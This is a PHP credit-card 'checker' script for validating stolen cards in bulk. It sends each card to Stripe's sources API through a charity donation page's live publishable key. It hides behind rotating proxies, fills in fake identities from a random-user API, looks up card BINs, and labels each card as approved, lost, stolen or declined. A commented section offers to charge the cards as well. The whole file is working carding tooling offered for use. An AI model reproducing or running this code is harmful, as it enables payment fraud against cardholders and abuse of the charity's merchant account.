<?php

////////////////////////////===[As of now we are using Stripe Gateway from https://bringmehope.org/donate/ it use v1/sources]

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Manila');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

$username = 'Put Zone Username Here';
$password = 'Put Zone Password Here';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'accept-encoding: gzip, deflate, br', 
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/v3/controller-6939e707ed72449242ad28283df1d390.html',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.'+'.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=5d5194f4-9afe-482a-891c-410fb24acd8d&sid=172c3634-ab01-4152-b4ce-c17552594133&pasted_fields=number&payment_user_agent=stripe.js%2Fed246b72%3B+stripe-js-v3%2Fed246b72&time_on_page=104441&referrer=https%3A%2F%2Fbringmehope.org%2Fdonate%2F&key=pk_live_8Ft339UAdyZSEgltJJpT87y300VlZCVKir');
$result = curl_exec($ch);

///$token = trim(strip_tags(getStr($result,'"id": "','"')));

//////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

///$ch = curl_init();
/////////========Luminati
///curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
///curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
///curl_setopt($ch, CURLOPT_URL, '#');
///curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
///curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);


//curl_setopt($ch, CURLOPT_HTTPHEADER, array(
/*/   'Host: '#',   
  'accept: ',
  'content-type: ',
  'cookie: ',   
  'origin: ',
  'referer:',
  'sec-fetch-mode: ',
  'sec-fetch-dest: ',
  'sec-fetch-site: ',  */
/////////////////////////////));
///curl_setopt($ch, CURLOPT_POSTFIELDS, '');

//$result = curl_exec($ch);
//$message = trim(strip_tags(getStr($result,'"message":"','"'))); 

///////////////////////// Bin Lookup Api //////////////////////////

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
	$type = 'Credit';
} else {
	$type = 'Debit';
}

/////////////////////////// [Card Response]  //////////////////////////

if(strpos($result, '/donations/thank_you?donation_number=','' )) {
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Approved (͏CVV) ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "pass"')){
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Approved (͏CVV) ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Approved (͏CVV) ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Thank You." )) {
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Approved (͏CVV) ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"status": "succeeded"')){
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Approved (͏CVV) ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Approved (͏CVV - Incorrect Zip) ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_zip" )) {
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Approved (͏CVV - Incorrect Zip ♛)」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Success" )) {
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Approved (͏CVV) ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "succeeded." )) {
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Approved (͏CVV) ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Fraudulent Card ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"type":"one-time"')){
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Approved (͏CVV) ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Insufficient Funds ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "insufficient_funds")) {
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Insufficient Funds ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "lost_card" )) {
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Lost Card ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "stolen_card" )) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Stolen Card ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Approved (CCN) ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Approved (CCN) ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Approved (CCN)♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "pickup_card" )) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Pickup Card (Reported Stolen Or Lost)♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Expired Card ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "expired_card" )) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Expired Card ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Incorrect Card Number ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_number")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Incorrect Card Number ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "service_not_allowed")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Service Not Allowed ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "do_not_honor")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Declined : Do_Not_Honor ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Card Declined ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "generic_decline")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Declined : Generic_Decline ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ CVC_Check : Unavailable ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "unchecked"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ CVC_Unchecked : Proxy Error ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ CVC_Unchecked : Fail ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"parameter_invalid_empty")){
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Declined : Missing Card Details ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"lock_timeout")){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Another Request In Process : Card Not Checked ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Card Doesnt Support Purchase ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"transaction_not_allowed")){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Card Doesnt Support Purchase ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"three_d_secure_redirect")){
     echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Card Doesnt Support Purchase ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Card is declined by your bank, please contact them for additional information.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ 3D Secure Redirect ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"missing_payment_information")){
     '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Missing Payment Informations ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
     '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Missing Credit Card Number ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
else {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「♛ Dead Proxy/Error Not listed ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

  curl_close($curl);
  ob_flush();
  //////=========Comment Echo $result If U Want To Hide Site Side Response
  echo $result;

///////////////////////////////////////////////===========================Edited By Asuna================================================\\\\\\\\\\\\\\\

?>
